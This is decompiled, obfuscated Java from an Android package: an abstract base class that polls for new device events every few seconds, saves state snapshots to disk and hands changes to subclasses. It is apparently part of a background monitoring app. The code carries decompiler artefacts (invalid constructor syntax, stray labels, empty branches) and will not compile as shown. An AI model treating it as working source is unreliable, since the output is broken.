package com.vvt.base.capture;

import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.io.q;
import java.io.File;
import java.io.Serializable;
import java.util.List;

public abstract class b
{
  private static final boolean a = a.b;
  private static final boolean b = a.e;
  private boolean c;
  private g d;
  private Handler e;
  private HandlerThread f;
  
  private void a()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject1 = this.f;
    if (localObject1 == null)
    {
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      Object localObject2 = d();
      localObject1 = (String)localObject2 + "Thread";
      localObject2 = new android/os/HandlerThread;
      ((HandlerThread)localObject2).<init>((String)localObject1);
      this.f = ((HandlerThread)localObject2);
      localObject1 = this.f;
      ((HandlerThread)localObject1).start();
      bool = a;
      if (bool) {}
      localObject1 = this.f.getLooper();
      localObject2 = new com/vvt/base/capture/d;
      ((d)localObject2).<init>(this, (Looper)localObject1);
      this.e = ((Handler)localObject2);
    }
    bool = a;
    if (bool) {}
  }
  
  private void n()
  {
    boolean bool = a;
    if (bool) {}
    this.e = null;
    HandlerThread localHandlerThread = this.f;
    if (localHandlerThread != null)
    {
      localHandlerThread = this.f;
      localHandlerThread.quit();
    }
    this.f = null;
    bool = a;
    if (bool) {}
  }
  
  private void o()
  {
    boolean bool1 = true;
    for (;;)
    {
      try
      {
        localObject1 = c();
        long l = 3000L;
        SystemClock.sleep(l);
        if (localObject1 != null)
        {
          g localg1 = this.d;
          if (localg1 != null)
          {
            g localg2 = ((f)localObject1).a();
            localg1 = this.d;
            boolean bool2 = localg1.isChangeFound(localg2);
            if (bool2)
            {
              localg1 = this.d;
              bool3 = localg1.isNewEventFound(localg2);
              if (bool3)
              {
                bool3 = bool1;
                boolean bool4 = a;
                if ((bool4) && (!bool3)) {
                  break label236;
                }
                g localg3 = this.d;
                localObject1 = ((f)localObject1).a(localg3, localg2);
                bool4 = ((List)localObject1).isEmpty();
                if (!bool4)
                {
                  bool4 = a;
                  if (bool4) {}
                  a((List)localObject1);
                }
                bool5 = bool1;
                if ((!bool2) || (bool3)) {
                  continue;
                }
                if ((bool5) || (bool1))
                {
                  this.d = localg2;
                  p();
                  bool1 = a;
                  if (!bool1) {}
                }
                return;
              }
            }
            boolean bool3 = false;
            localg1 = null;
            continue;
            bool1 = false;
            localg4 = null;
            continue;
          }
        }
        g localg4 = this.d;
        if (localg4 != null) {
          continue;
        }
        bool1 = b;
        if (!bool1) {
          continue;
        }
        continue;
        boolean bool5 = false;
      }
      finally {}
      label236:
      Object localObject1 = null;
    }
  }
  
  private void p()
  {
    Object localObject = new Object[2];
    String str = e();
    localObject[0] = str;
    str = f();
    localObject[1] = str;
    localObject = String.format("%s/%s", (Object[])localObject);
    q.a((Serializable)this.d, (String)localObject);
  }
  
  private g q()
  {
    int i = 2;
    Object[] arrayOfObject = new Object[i];
    String str = e();
    arrayOfObject[0] = str;
    int j = 1;
    str = f();
    arrayOfObject[j] = str;
    Object localObject = q.a(String.format("%s/%s", arrayOfObject));
    if (localObject != null)
    {
      boolean bool = localObject instanceof g;
      if (bool) {
        localObject = (g)localObject;
      }
    }
    for (localObject = a((g)localObject);; localObject = null) {
      return (g)localObject;
    }
  }
  
  public int a(int paramInt)
  {
    int i = 0;
    Object localObject1 = null;
    try
    {
      Object localObject3 = c();
      if (localObject3 != null)
      {
        localObject3 = ((f)localObject3).a(paramInt);
        if (localObject3 != null)
        {
          boolean bool1 = ((List)localObject3).isEmpty();
          if (!bool1)
          {
            i = ((List)localObject3).size();
            bool1 = a;
            if (bool1) {}
            a((List)localObject3);
          }
        }
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = b;
        if (!bool2) {}
      }
    }
    finally {}
    return i;
  }
  
  protected abstract g a(g paramg);
  
  protected abstract void a(List paramList);
  
  protected abstract e b();
  
  protected abstract f c();
  
  protected abstract String d();
  
  protected abstract String e();
  
  protected abstract String f();
  
  public void g()
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = q();
    this.d = ((g)localObject);
    localObject = this.d;
    if (localObject == null)
    {
      localObject = c().a();
      this.d = ((g)localObject);
      p();
    }
    bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    a();
    localObject = new com/vvt/base/capture/c;
    ((c)localObject).<init>(this);
    e locale = b();
    if (locale != null)
    {
      boolean bool2 = a;
      if (bool2) {}
      locale.a((i)localObject);
      bool1 = true;
      this.c = bool1;
    }
    bool1 = a;
    if (bool1) {}
  }
  
  public void h()
  {
    boolean bool1 = a;
    if (bool1) {}
    e locale = b();
    boolean bool2 = a;
    if ((!bool2) || (locale != null))
    {
      locale.b();
      bool1 = false;
      locale = null;
      this.c = false;
    }
    locale = null;
    this.d = null;
    p();
    bool1 = a;
    if (bool1) {}
    n();
    bool1 = a;
    if (bool1) {}
  }
  
  public void i()
  {
    this.d = null;
    g localg = c().a();
    this.d = localg;
    p();
  }
  
  public void j()
  {
    File localFile = new java/io/File;
    String str1 = e();
    String str2 = f();
    localFile.<init>(str1, str2);
    boolean bool = localFile.exists();
    if (bool) {
      localFile.delete();
    }
  }
  
  public boolean k()
  {
    return this.c;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/base/capture/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */